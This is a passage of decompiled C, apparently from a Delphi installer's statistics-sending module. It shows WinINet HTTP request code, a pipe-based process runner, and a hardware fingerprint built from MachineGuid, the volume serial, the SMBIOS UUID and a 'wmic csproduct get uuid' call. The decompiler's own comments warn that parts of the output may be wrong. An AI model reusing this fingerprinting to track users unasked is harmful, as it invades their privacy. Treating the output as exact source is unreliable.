    __writefsdword(0, v4[0]);
    v5 = (int *)&loc_457DC5;
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_457DE2;
  sub_405598(v9);
  return v8;
}
// 467FD0: using guessed type wchar_t **off_467FD0;

//----- (004581A0) --------------------------------------------------------
_DWORD *sub_4581A0()
{
  _DWORD *result; // eax

  if ( dword_46F6BC )
    return sub_433460(*off_467F18, (int)L"StatRoot already initialized", 0);
  result = (_DWORD *)unknown_libname_174(cls_MiniStatUtil_TInstallerStatRootSender, 1);
  dword_46F6BC = (int)result;
  return result;
}
// 457FAC: using guessed type int (*cls_MiniStatUtil_TInstallerStatRootSender[3])();
// 4581E0: using guessed type wchar_t aStatrootAlread[29];
// 459880: using guessed type int __fastcall unknown_libname_174(_DWORD, _DWORD);
// 467F18: using guessed type int *off_467F18;
// 46F6BC: using guessed type int dword_46F6BC;

//----- (00458220) --------------------------------------------------------
_DWORD *__usercall sub_458220@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  if ( !dword_46F6BC )
    return sub_433460(*off_467F18, (int)L"StatRoot already deinitialized", 0);
  sub_452E90((int *)dword_46F6BC, 1, a1, a2, a3);
  return (_DWORD *)unknown_libname_94(&dword_46F6BC);
}
// 41C304: using guessed type int __fastcall unknown_libname_94(_DWORD);
// 458268: using guessed type wchar_t aStatrootAlread_0[31];
// 467F18: using guessed type int *off_467F18;
// 46F6BC: using guessed type int dword_46F6BC;

//----- (004582B0) --------------------------------------------------------
int sub_4582B0()
{
  return dword_46F6BC;
}
// 46F6BC: using guessed type int dword_46F6BC;

//----- (004582D0) --------------------------------------------------------
_DWORD *__usercall sub_4582D0@<eax>(int a1@<eax>, int a2@<edx>, int a3)
{
  unsigned int v4[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v5; // [esp-4h] [ebp-10h]
  int v6; // [esp+4h] [ebp-8h] BYREF
  int v7; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v6 = a2;
  v7 = a1;
  System::__linkproc__ LStrAddRef(a2);
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_45832B;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  if ( *(_WORD *)(a3 + 10) )
    (*(void (__fastcall **)(_DWORD, int, int, _DWORD))(a3 + 8))(*(_DWORD *)(a3 + 12), v7, v6, *(_DWORD *)(a3 - 4));
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_458332;
  return sub_406C68(&v6);
}
// 406D38: using guessed type int __fastcall System::__linkproc__ LStrAddRef(_DWORD);

//----- (00458340) --------------------------------------------------------
bool __fastcall sub_458340(int a1, int a2, int a3, int a4, int a5)
{
  const WCHAR *v5; // eax
  const WCHAR *v6; // eax
  char v7; // zf
  const WCHAR *v8; // eax
  const WCHAR *v9; // eax
  int v10; // ecx
  void *v11; // eax
  int v12; // eax
  int v13; // ecx
  int v15; // [esp-34h] [ebp-CCh]
  const WCHAR *v16; // [esp-30h] [ebp-C8h]
  DWORD v17; // [esp-30h] [ebp-C8h]
  void *v18; // [esp-2Ch] [ebp-C4h]
  DWORD v19; // [esp-28h] [ebp-C0h]
  const wchar_t *v20; // [esp-28h] [ebp-C0h]
  struct _EXCEPTION_REGISTRATION_RECORD *v21; // [esp-24h] [ebp-BCh] BYREF
  DWORD v22; // [esp-20h] [ebp-B8h]
  int *v23; // [esp-1Ch] [ebp-B4h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-B0h] BYREF
  void *v25; // [esp-14h] [ebp-ACh]
  int *v26; // [esp-10h] [ebp-A8h]
  unsigned int v27[2]; // [esp-Ch] [ebp-A4h] BYREF
  int *v28; // [esp-4h] [ebp-9Ch]
  int v29; // [esp+4h] [ebp-94h] BYREF
  int v30; // [esp+8h] [ebp-90h] BYREF
  int v31; // [esp+Ch] [ebp-8Ch] BYREF
  struct $2B4FDC4BF487E67F052937EE78FAE255 UrlComponents; // [esp+10h] [ebp-88h] BYREF
  DWORD dwOptionalLength; // [esp+4Ch] [ebp-4Ch]
  LPVOID lpOptional; // [esp+50h] [ebp-48h]
  DWORD dwFlags; // [esp+54h] [ebp-44h]
  __int32 v36; // [esp+58h] [ebp-40h] BYREF
  int v37; // [esp+5Ch] [ebp-3Ch] BYREF
  int v38; // [esp+60h] [ebp-38h] BYREF
  INTERNET_PORT nServerPort[2]; // [esp+64h] [ebp-34h]
  HINTERNET hInternet; // [esp+68h] [ebp-30h]
  int Buffer; // [esp+6Ch] [ebp-2Ch] BYREF
  int v42; // [esp+70h] [ebp-28h] BYREF
  int v43; // [esp+74h] [ebp-24h] BYREF
  DWORD dwIndex; // [esp+78h] [ebp-20h] BYREF
  DWORD dwBufferLength; // [esp+7Ch] [ebp-1Ch] BYREF
  HINTERNET hRequest; // [esp+80h] [ebp-18h]
  HINTERNET hConnect; // [esp+84h] [ebp-14h]
  bool v48; // [esp+8Bh] [ebp-Dh]
  int v49; // [esp+8Ch] [ebp-Ch]
  int v50; // [esp+90h] [ebp-8h]
  int v51; // [esp+94h] [ebp-4h]
  int savedregs; // [esp+98h] [ebp+0h] BYREF

  v30 = 0;
  v29 = 0;
  v31 = 0;
  v42 = 0;
  v38 = 0;
  v37 = 0;
  v36 = 0;
  v51 = a3;
  v49 = a2;
  v50 = a1;
  v28 = &savedregs;
  v27[1] = (unsigned int)&loc_458734;
  v27[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v27);
  sub_407030(&v42, (__int32)L"Accept-Encoding: gzip");
  if ( v49 )
  {
    sub_407030(&v36, (__int32)L"POST");
    lpOptional = (LPVOID)sub_4074F8(v49);
    dwOptionalLength = System::__linkproc__ LStrLen(v49);
    sub_407910(&v42, L"\r\nContent-Type: application/x-www-form-urlencoded");
  }
  else
  {
    sub_407030(&v36, (__int32)&off_45878C);
    lpOptional = 0;
    dwOptionalLength = 0;
  }
  v48 = 0;
  Guitesting::TGUITestCase::Hide(&UrlComponents, 60);
  UrlComponents.dwSchemeLength = 32;
  UrlComponents.dwHostNameLength = 256;
  UrlComponents.dwUrlPathLength = 2048;
  UrlComponents.dwStructSize = 60;
  *(_DWORD *)nServerPort = 80;
  v5 = (const WCHAR *)sub_407790(v50);
  if ( InternetCrackUrlW(v5, 0, 0, &UrlComponents) )
  {
    v48 = 1;
    *(_DWORD *)nServerPort = UrlComponents.nPort;
    unknown_libname_50(&v38, UrlComponents.lpszHostName);
    sub_407AD8(v38, 1, UrlComponents.dwHostNameLength, &v38);
    unknown_libname_50(&v37, UrlComponents.lpszUrlPath);
    sub_407AD8(v37, 1, UrlComponents.dwUrlPathLength, &v37);
  }
  hInternet = InternetOpenA("transport", 0, 0, 0, 0);
  Buffer = 60000;
  InternetSetOptionW(hInternet, 2u, &Buffer, 4u);
  Buffer = 60000;
  InternetSetOptionW(hInternet, 6u, &Buffer, 4u);
  LOWORD(v21) = nServerPort[0];
  v6 = (const WCHAR *)sub_407790(v38);
  hConnect = InternetConnectW(hInternet, v6, (INTERNET_PORT)v21, 0, 0, 3u, 0, 0);
  if ( hConnect )
  {
    dwFlags = -2080374528;
    sub_407AD8(v50, 1, 8, &v31);
    sub_407AA0(v31, (int)off_467E28);
    if ( v7 )
      dwFlags |= 0x800000u;
    v26 = &savedregs;
    v25 = &loc_4586FA;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    v22 = dwFlags;
    v16 = (const WCHAR *)sub_407790(v37);
    v8 = (const WCHAR *)sub_407790(v36);
    hRequest = HttpOpenRequestW(hConnect, v8, v16, 0, 0, 0, v22, 0);
    if ( hRequest )
    {
      v23 = &savedregs;
      v22 = (DWORD)&loc_4586DC;
      v21 = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&v21);
      v19 = dwOptionalLength;
      v18 = lpOptional;
      v17 = System::__linkproc__ LStrLen(v42);
      v9 = (const WCHAR *)sub_407790(v42);
      if ( HttpSendRequestW(hRequest, v9, v17, v18, v19) )
      {
        dwBufferLength = 4;
        dwIndex = 0;
        if ( !HttpQueryInfoW(hRequest, 0x20000013u, &v43, &dwBufferLength, &dwIndex) )
        {
          sub_4582D0(0, (int)"Failed to exec HttpQueryInfo", (int)&savedregs);
          System::__linkproc__ TryFinallyExit(v21, v22, v23);
          System::__linkproc__ TryFinallyExit(ExceptionList, v25, v26);
          goto LABEL_20;
        }
        v48 = v43 == 200;
        if ( v43 != 200 )
        {
          sub_407890(&v42, 2048, v10);
          dwBufferLength = 2 * System::__linkproc__ LStrLen(v42);
          v11 = (void *)sub_4071C0(&v42);
          if ( HttpQueryInfoW(hRequest, 0x16u, v11, &dwBufferLength, &dwIndex) )
          {
            v12 = sub_407790(v42);
            unknown_libname_50(&v42, v12);
            v20 = L"Response code: ";
            sub_415178(&v29, 0, v13, (unsigned int)v43);
            v15 = v42;
            sub_4079F0(&v30, 4);
            sub_433460(*off_467F18, v30, 0);
          }
        }
        sub_4582D0(v43, 0, (int)&savedregs);
      }
      __writefsdword(0, v15);
      InternetCloseHandle(hRequest);
      __writefsdword(0, (unsigned int)v20);
      v22 = (DWORD)&loc_458701;
      InternetCloseHandle(hConnect);
      goto LABEL_20;
    }
    sub_4582D0(0, (int)"Failed to exec HttpOpenRequestW", (int)&savedregs);
    System::__linkproc__ TryFinallyExit(ExceptionList, v25, v26);
  }
  else
  {
    sub_4582D0(0, (int)"Failed to exec InternetConnectW", (int)&savedregs);
  }
LABEL_20:
  __writefsdword(0, v27[0]);
  v28 = (int *)&loc_45873B;
  sub_406CA4((int)&v29, 3);
  sub_406CA4((int)&v36, 3);
  sub_406C44(&v42);
  return v48;
}
// 458530: variable 'v7' is possibly undefined
// 45862C: variable 'v10' is possibly undefined
// 458682: variable 'v13' is possibly undefined
// 4586CA: variable 'v15' is possibly undefined
// 4586E8: variable 'v20' is possibly undefined
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 407104: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 4237B0: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 458754: using guessed type wchar_t aAcceptEncoding[22];
// 45878C: using guessed type void *off_45878C;
// 4587A0: using guessed type wchar_t aPost[5];
// 4587B8: using guessed type wchar_t aContentTypeApp[50];
// 4588B8: using guessed type wchar_t aResponseCode[16];
// 467F18: using guessed type int *off_467F18;

//----- (00458900) --------------------------------------------------------
_DWORD *__cdecl sub_458900(int a1)
{
  int v1; // eax
  int v2; // eax
  unsigned int v4[2]; // [esp-Ch] [ebp-418h] BYREF
  int *v5; // [esp-4h] [ebp-410h]
  char Buffer[1024]; // [esp+0h] [ebp-40Ch] BYREF
  void *v7; // [esp+400h] [ebp-Ch] BYREF
  DWORD TotalBytesAvail; // [esp+404h] [ebp-8h] BYREF
  int v9; // [esp+408h] [ebp-4h]
  int savedregs; // [esp+40Ch] [ebp+0h] BYREF

  v7 = 0;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_4589FE;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_406C68(&v7);
  do
  {
    if ( !PeekNamedPipe(*(HANDLE *)(a1 - 4), 0, 0, 0, &TotalBytesAvail, 0) || !TotalBytesAvail )
      break;
    TotalBytesAvail = 0;
    Guitesting::TGUITestCase::Hide(Buffer, 1024);
    ReadFile(*(HANDLE *)(a1 - 4), Buffer, 0x400u, &TotalBytesAvail, 0);
    if ( TotalBytesAvail )
    {
      v9 = System::__linkproc__ LStrLen(v7) + 1;
      v1 = System::__linkproc__ LStrLen(v7);
      sub_4075BC(&v7, TotalBytesAvail + v1, 0);
      v2 = sub_4071C8(&v7);
      System::Move(Buffer, (void *)(v2 + v9 - 1), TotalBytesAvail);
    }
  }
  while ( TotalBytesAvail >= 0x400 );
  sub_4072D4(*(volatile __int32 **)(a1 + 8), v7);
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_458A05;
  return sub_406C68(&v7);
}
// 407104: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);
// 4237B0: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);

//----- (00458A10) --------------------------------------------------------
DWORD __fastcall sub_458A10(__int32 a1, __int32 a2, int a3, int a4, _DWORD *a5, _DWORD *a6)
{
  const void *v6; // eax
  BOOL v7; // eax
  DWORD v9; // [esp-18h] [ebp-C8h]
  unsigned int v10[2]; // [esp-Ch] [ebp-BCh] BYREF
  int *v11; // [esp-4h] [ebp-B4h]
  struct _SECURITY_ATTRIBUTES PipeAttributes; // [esp+4h] [ebp-ACh] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+10h] [ebp-A0h] BYREF
  struct _STARTUPINFOW StartupInfo; // [esp+20h] [ebp-90h] BYREF
  int v15; // [esp+64h] [ebp-4Ch] BYREF
  int v16; // [esp+68h] [ebp-48h] BYREF
  HANDLE v17; // [esp+6Ch] [ebp-44h] BYREF
  HANDLE v18; // [esp+70h] [ebp-40h] BYREF
  HANDLE v19; // [esp+74h] [ebp-3Ch] BYREF
  HANDLE hWritePipe; // [esp+78h] [ebp-38h] BYREF
  HANDLE hReadPipe; // [esp+7Ch] [ebp-34h] BYREF
  LPCWSTR lpCurrentDirectory; // [esp+80h] [ebp-30h]
  LPCWSTR lpApplicationName; // [esp+84h] [ebp-2Ch]
  LPWSTR lpCommandLine; // [esp+88h] [ebp-28h]
  DWORD ExitCode; // [esp+8Ch] [ebp-24h] BYREF
  HANDLE hHandle; // [esp+90h] [ebp-20h]
  bool v27; // [esp+97h] [ebp-19h]
  DWORD NumberOfBytesWritten; // [esp+98h] [ebp-18h] BYREF
  DWORD v29; // [esp+9Ch] [ebp-14h]
  int v30; // [esp+A0h] [ebp-10h]
  __int32 v31; // [esp+A4h] [ebp-Ch]
  __int32 v32; // [esp+A8h] [ebp-8h]
  HANDLE hObject; // [esp+ACh] [ebp-4h] BYREF
  int savedregs; // [esp+B0h] [ebp+0h] BYREF

  v16 = 0;
  v15 = 0;
  v30 = a3;
  v31 = a2;
  v32 = a1;
  if ( a6 )
    *a6 = 0;
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_458CDD;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  sub_406C68(a6);
  PipeAttributes.nLength = 12;
  PipeAttributes.bInheritHandle = -1;
  PipeAttributes.lpSecurityDescriptor = 0;
  v19 = (HANDLE)-1;
  hReadPipe = (HANDLE)-1;
  hObject = (HANDLE)-1;
  hWritePipe = (HANDLE)-1;
  v17 = (HANDLE)-1;
  v18 = (HANDLE)-1;
  CreatePipe(&hReadPipe, &hWritePipe, &PipeAttributes, 0);
  CreatePipe(&hObject, &v19, &PipeAttributes, 0);
  CreatePipe(&v18, &v17, &PipeAttributes, 0);
  sub_40732C(&v16, a5, dword_458CFC);
  NumberOfBytesWritten = 0;
  v9 = System::__linkproc__ LStrLen(v16);
  v6 = (const void *)sub_4071C8(&v16);
  WriteFile_1(hWritePipe, v6, v9, &NumberOfBytesWritten, 0);
  Guitesting::TGUITestCase::Hide(&StartupInfo, 68);
  StartupInfo.cb = 68;
  StartupInfo.wShowWindow = v30;
  StartupInfo.dwFlags = 257;
  StartupInfo.hStdInput = hReadPipe;
  StartupInfo.hStdOutput = v19;
  StartupInfo.hStdError = v17;
  if ( v32 )
    lpApplicationName = (LPCWSTR)sub_407790(v32);
  else
    lpApplicationName = 0;
  sub_407030(&v15, v31);
  if ( v15 )
  {
    if ( v32 )
    {
      sub_4079F0(&v15, 4);
      lpApplicationName = 0;
    }
  }
  else
  {
    sub_407030(&v15, v32);
    lpApplicationName = 0;
  }
  lpCommandLine = (LPWSTR)sub_407790(v15);
  if ( a4 )
    lpCurrentDirectory = (LPCWSTR)sub_407790(a4);
  else
    lpCurrentDirectory = 0;
  Guitesting::TGUITestCase::Hide(&ProcessInformation, 16);
  v7 = CreateProcessW(
         lpApplicationName,
         lpCommandLine,
         0,
         0,
         -1,
         0,
         0,
         lpCurrentDirectory,
         &StartupInfo,
         &ProcessInformation);
  v27 = v7;
  if ( v7 )
  {
    hHandle = ProcessInformation.hProcess;
    CloseHandle_0(ProcessInformation.hThread);
    do
    {
      ExitCode = WaitForSingleObject(hHandle, 0x64u);
      sub_458900((int)&savedregs);
    }
    while ( ExitCode == 258 );
    if ( ExitCode == -1 )
    {
      v29 = -1;
    }
    else
    {
      GetExitCodeProcess(hHandle, &ExitCode);
      v29 = ExitCode;
    }
    CloseHandle_0(hHandle);
  }
  else
  {
    v29 = -2;
    sub_406C68(a6);
  }
  CloseHandle_0(hReadPipe);
  CloseHandle_0(hWritePipe);
  CloseHandle_0(hObject);
  CloseHandle_0(v19);
  CloseHandle_0(v18);
  CloseHandle_0(v17);
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_458CE4;
  sub_406C44(&v15);
  sub_406C68(&v16);
  return v29;
}
// 407104: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);
// 4237B0: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 458CFC: using guessed type int dword_458CFC[4];

//----- (00458D30) --------------------------------------------------------
_DWORD *__fastcall sub_458D30(int a1, int a2)
{
  unsigned int v3[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v4; // [esp-4h] [ebp-10h]
  int v5; // [esp+0h] [ebp-Ch]
  int v6; // [esp+4h] [ebp-8h]
  int v7; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v6 = a2;
  v7 = a1;
  v5 = sub_441F30((int)&cls_RegistryUtil_TUnicodeRegistry, 1, a1, 0);
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_458DA2;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  sub_442980(v5, HKEY_LOCAL_MACHINE);
  if ( sub_442610(v5, (__int32)L"\\SOFTWARE\\Microsoft\\Cryptography") )
    sub_4428D0(v5, (int)L"MachineGuid", (int *)v6);
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_458DA9;
  return sub_405598((_DWORD *)v5);
}
// 441D10: using guessed type __int16 cls_RegistryUtil_TUnicodeRegistry;
// 458DBC: using guessed type wchar_t aSoftwareMicros[33];
// 458E0C: using guessed type wchar_t aMachineguid[12];

//----- (00458E30) --------------------------------------------------------
int __usercall sub_458E30@<eax>(int a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>)
{
  int *v5; // [esp-30h] [ebp-40h]
  unsigned int v6[2]; // [esp-24h] [ebp-34h] BYREF
  int *v7; // [esp-1Ch] [ebp-2Ch]
  _DWORD v8[6]; // [esp-18h] [ebp-28h] BYREF
  __int32 v9; // [esp+0h] [ebp-10h] BYREF
  __int32 v10; // [esp+4h] [ebp-Ch] BYREF
  _WORD *v11; // [esp+8h] [ebp-8h] BYREF
  int v12; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v10 = 0;
  v9 = 0;
  v8[5] = a2;
  v8[4] = a4;
  v8[3] = a3;
  v12 = a1;
  v8[2] = &savedregs;
  v8[1] = &loc_458F12;
  v8[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  Guitesting::TGUITestCase::Hide(a1, 16);
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_458ED7;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_458D30(131097, (int)&v10);
  sub_407030((volatile __int32 *)&v11, v10);
  if ( !v11 )
  {
    sub_458D30(131353, (int)&v9);
    sub_407030((volatile __int32 *)&v11, v9);
  }
  if ( v11 )
  {
    v5 = &dword_458F3C;
    sub_4079F0((int *)&v11, 3);
  }
  sub_4148FC(v11, v12);
  __writefsdword(0, (unsigned int)v5);
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_458F19;
  return sub_406CA4((int)&v9, 3);
}
// 458E30: could not find valid save-restore pair for ebx
// 458E30: could not find valid save-restore pair for edi
// 458E30: could not find valid save-restore pair for esi
// 458ED2: variable 'v5' is possibly undefined
// 4237B0: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 458F3C: using guessed type int dword_458F3C;

//----- (00458F40) --------------------------------------------------------
int __fastcall sub_458F40(volatile __int32 *a1)
{
  unsigned int v2[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v3; // [esp-4h] [ebp-10h]
  int v4; // [esp+0h] [ebp-Ch] BYREF
  int v5; // [esp+4h] [ebp-8h] BYREF
  volatile __int32 *v6; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v5 = 0;
  v4 = 0;
  v6 = a1;
  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_458FE7;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( !dword_46F6C4 )
  {
    sub_4273A0((int)L"SystemDrive", &v5);
    sub_406FE8(&dword_46F6C4, v5);
    if ( !dword_46F6C4 )
    {
      sub_406FE8(&dword_46F6C4, (int)dword_459024);
      sub_407910(&dword_46F6C4, dword_459034);
    }
    sub_425250(dword_46F6C4, &v4);
    sub_406FE8(&dword_46F6C4, v4);
  }
  sub_406FE8(v6, dword_46F6C4);
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_458FEE;
  return sub_406CA4((int)&v4, 2);
}
// 459000: using guessed type wchar_t aSystemdrive_0[12];
// 459024: using guessed type int dword_459024[4];
// 459034: using guessed type int dword_459034[3];

//----- (00459040) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
char __fastcall sub_459040(DWORD *a1)
{
  int v1; // ecx
  const WCHAR *v2; // eax
  WCHAR *v4; // [esp-34h] [ebp-50h]
  DWORD v5; // [esp-30h] [ebp-4Ch]
  DWORD *v6; // [esp-2Ch] [ebp-48h]
  unsigned int v7[2]; // [esp-18h] [ebp-34h] BYREF
  void **v8; // [esp-10h] [ebp-2Ch]
  _DWORD v9[3]; // [esp-Ch] [ebp-28h] BYREF
  int v10; // [esp+0h] [ebp-1Ch] BYREF
  DWORD MaximumComponentLength; // [esp+4h] [ebp-18h] BYREF
  DWORD FileSystemFlags; // [esp+8h] [ebp-14h] BYREF
  UINT uMode; // [esp+Ch] [ebp-10h]
  __int32 v14; // [esp+10h] [ebp-Ch] BYREF
  unsigned int v15; // [esp+14h] [ebp-8h]
  LPDWORD lpVolumeSerialNumber; // [esp+18h] [ebp-4h]
  void *savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v14 = 0;
  v10 = 0;
  lpVolumeSerialNumber = a1;
  v9[2] = &savedregs;
  v9[1] = &loc_459113;
  v9[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  sub_458F40(&v14);
  uMode = SetErrorMode(1u);
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_4590EE;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  sub_406C44(&v10);
  FileSystemFlags = 0;
  MaximumComponentLength = 0;
  sub_407890(&v10, 261, v1);
  v6 = lpVolumeSerialNumber;
  v5 = System::__linkproc__ LStrLen(v10);
  v4 = (WCHAR *)sub_407790(v10);
  v2 = (const WCHAR *)sub_407790(v14);
  HIBYTE(v15) = GetVolumeInformationW(v2, v4, v5, v6, &MaximumComponentLength, &FileSystemFlags, 0, 0);
  __writefsdword(0, v7[0]);
  v8 = (void **)&loc_4590F5;
  SetErrorMode(uMode);
  __writefsdword(0, v15);
  savedregs = &loc_45911A;
  sub_406C44(&v10);
  sub_406C44(&v14);
  return HIBYTE(v15);
}
// 459105: bad sp value at call
// 45910D: bad sp value at call
// 459099: variable 'v1' is possibly undefined
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);

//----- (00459130) --------------------------------------------------------
int __usercall sub_459130@<eax>(DWORD a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>)
{
  _DWORD v5[4]; // [esp+0h] [ebp-18h] BYREF
  DWORD v6[2]; // [esp+10h] [ebp-8h] BYREF

  v6[1] = a1;
  if ( !dword_467E44 && !dword_467E40 )
  {
    sub_458E30((int)v5, a2, a3, a4);
    dword_467E40 = v5[2] ^ v5[0];
    dword_467E44 = v5[3] ^ v5[1];
    v6[0] = 0;
    if ( sub_459040(v6) )
      dword_467E40 ^= v6[0];
  }
  return unknown_libname_75(dword_467E40, dword_467E44);
}
// 4151D0: using guessed type _DWORD __stdcall unknown_libname_75(_DWORD, _DWORD);
// 467E40: using guessed type int dword_467E40;
// 467E44: using guessed type int dword_467E44;
// 459130: using guessed type _DWORD var_18[4];

//----- (004591C0) --------------------------------------------------------
__int64 __usercall sub_4591C0@<edx:eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int v3; // ecx
  _DWORD *v4; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *v6; // [esp-24h] [ebp-68h] BYREF
  _DWORD *v7; // [esp-20h] [ebp-64h]
  int *v8; // [esp-1Ch] [ebp-60h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-5Ch] BYREF
  void *v10; // [esp-14h] [ebp-58h]
  int *v11; // [esp-10h] [ebp-54h]
  _DWORD v12[6]; // [esp-Ch] [ebp-50h] BYREF
  int v13; // [esp+Ch] [ebp-38h] BYREF
  __int32 v14; // [esp+10h] [ebp-34h] BYREF
  int v15; // [esp+14h] [ebp-30h] BYREF
  __int64 v16[2]; // [esp+18h] [ebp-2Ch] BYREF
  int v17; // [esp+28h] [ebp-1Ch]
  int *v18; // [esp+2Ch] [ebp-18h]
  _DWORD *v19; // [esp+30h] [ebp-14h]
  int v20; // [esp+34h] [ebp-10h] BYREF
  int v21; // [esp+38h] [ebp-Ch]
  __int64 v22; // [esp+3Ch] [ebp-8h]
  int savedregs; // [esp+44h] [ebp+0h] BYREF

  v13 = 0;
  v14 = 0;
  v15 = 0;
  v20 = 0;
  v12[2] = &savedregs;
  v12[1] = &loc_459405;
  v12[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  Guitesting::TGUITestCase::Hide(v16, 16);
  v11 = &savedregs;
  v10 = &loc_459288;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( !dword_46F6C0 )
  {
    v19 = (_DWORD *)sub_405568((int)&cls_SMBIOSUtil_TSMBIOSClient, 1);
    v8 = &savedregs;
    v7 = &loc_459277;
    v6 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v6);
    v18 = (int *)sub_450CA0((int)v19, 1, 27);
    if ( v18 )
    {
      v17 = *v18;
      sub_4149F8(v17 + 8, &v15, v3);
      sub_406FE8(&dword_46F6C0, v15);
    }
    __writefsdword(0, (unsigned int)v6);
    v8 = (int *)&loc_45927E;
    sub_405598(v19);
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v11 = &savedregs;
  v10 = &loc_4593A0;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( !dword_46F6C0 )
  {
    v8 = 0;
    v7 = 0;
    v4 = sub_406C68(&v20);
    if ( !sub_458A10((__int32)L"wmic", (__int32)L"csproduct get uuid", 0, (int)v8, v7, v4) )
    {
      sub_407840(&dword_46F6C0, v20, (int)ExceptionList);
      v21 = sub_407B7C((int)L"UUID", dword_46F6C0, 1);
      if ( v21 > 0 )
      {
        sub_407B20(&dword_46F6C0, 1, v21 + 3);
        sub_414CB4(dword_46F6C0, &v14);
        sub_406FE8(&dword_46F6C0, v14);
        v21 = sub_407B7C((int)dword_45948C, dword_46F6C0, 1);
        if ( v21 > 0 )
          sub_407B20(&dword_46F6C0, v21, 0x7FFFFFFF);
      }
      v8 = dword_45949C;
      v7 = (_DWORD *)dword_46F6C0;
      v6 = (struct _EXCEPTION_REGISTRATION_RECORD *)&dword_4594AC;
      sub_4079F0(&dword_46F6C0, 3);
    }
  }
  sub_4148FC((_WORD *)dword_46F6C0, (int)v16);
  __writefsdword(0, (unsigned int)v6);
  sub_459130((DWORD)&v13, a1, a2, a3);
  v22 = v16[1] ^ qword_467E40 ^ v16[0];
  __writefsdword(0, (unsigned int)ExceptionList);
  v11 = (int *)&loc_45940C;
  sub_406CA4((int)&v13, 3);
  sub_406C68(&v20);
  return v22;
}
// 45924F: variable 'v3' is possibly undefined
// 4237B0: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 450BDC: using guessed type __int16 cls_SMBIOSUtil_TSMBIOSClient;
// 459428: using guessed type wchar_t aCsproductGetUu[19];
// 45945C: using guessed type wchar_t aWmic[5];
// 459474: using guessed type wchar_t aUuid[5];
// 45948C: using guessed type int dword_45948C[4];
// 45949C: using guessed type int dword_45949C[4];
